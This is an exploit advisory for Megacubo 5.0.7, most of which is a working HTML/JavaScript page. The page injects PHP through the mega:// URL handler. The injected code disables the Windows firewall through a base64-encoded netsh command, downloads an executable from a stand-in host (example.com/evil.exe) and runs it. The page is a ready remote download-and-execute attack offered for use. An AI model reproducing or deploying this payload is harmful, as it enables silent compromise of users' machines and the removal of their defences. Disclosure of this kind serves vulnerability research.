Megacubo 5.0.7 (mega://) Remote File Download and Execute Exploit
=================================================================

Megacubo 5.0.7 download & Execute
by :JJunior
site: http://www.musicastop.com.br/

tested against Internet Explorer 7 and Mozilla Firefox  1.5  Windows Xp sp 3

software site: http://www.megacubo.net/tv/
download url: http://sourceforge.net/project/showfiles.php?group_id=231636&package_id=280849&release_id=608023
 
description:
"Megacubo is a IPTV tuner application written in PHP + Winbinder.
It has a catalogue of links of TV streams which are available
for free in the web. At the moment it only runs on Windows(2000,
XP and Vista)."
 
example exploit, download & Execute :
 

<html>
<head>
<title>MegaCubo - download & Execute</title>
<meta http-equiv="Content-Type" content="text/html; ">
</head>
<body>
<script>
// url download & exec code evil
evil = &#039;http://www.example.com/evil.exe&#039;;
 
// disable firewall  encode base_64
firewall = &#039;bmV0c2ggZmlyZXdhbGwgc2V0IG9wbW9kZSBtb2RlID0gZGlzYWJsZQ==&#039;;
 
shellcode = &#039;mega://play|con.."a()".system(base64_decode("&#039;+firewall+&#039;")).fputs(fopen("c:/Megacubo.exe","w"),file_get_contents("&#039;+evil+&#039;")).system("C:/Megacubo.exe")."/?");print(&#039;;
 
// shell code
window.location=shellcode;

</script>
</body>
</html>



